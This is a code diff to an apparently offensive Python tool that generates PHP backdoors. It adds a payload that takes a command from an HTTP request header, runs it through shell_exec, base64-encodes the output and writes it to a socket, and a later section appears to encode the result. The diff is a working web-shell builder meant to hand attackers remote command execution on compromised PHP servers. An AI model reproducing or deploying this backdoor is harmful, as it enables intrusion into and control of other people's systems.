@@ -22,12 +22,13 @@ args = parser.parse_args()
 
 def generate_backdoor(option):
 	if(option=="shell_system"):
-		return "echo 'lala';"
+		return 'function f_system($cmd){if(isset($cmd) && $cmd!=""){$var=shell_exec($cmd." 2>&1");return base64_encode($var);}} if(isset($_SERVER["HTTP_CMD"])){$msg=f_system($_SERVER["HTTP_CMD"]);}'
 	if(option=="shell_nosystem"):
 		return "echo 'WTF';"
 
 #Let's write our backdoor ! 
 backdoor=""
+
 
 
 supported_stuff=['shell_system','shell_nosystem']
@@ -40,6 +41,15 @@ if(args.stuff):
 			break
 	for option in options:
 		backdoor+=generate_backdoor(option)
+
+
+
+
+
+backdoor+="$fp = fsockopen('localhost', 1223, $errno, $errstr, 30);"
+backdoor+="fwrite($fp, $msg);"
+backdoor+="fclose($fp);"
+#backdoor+='echo "DEBUG";foreach (getallheaders() as $name => $value) {echo "$name: $value\n";} echo ($_SERVER["HTTP_CMD"]);'
 
 
 #Encodage
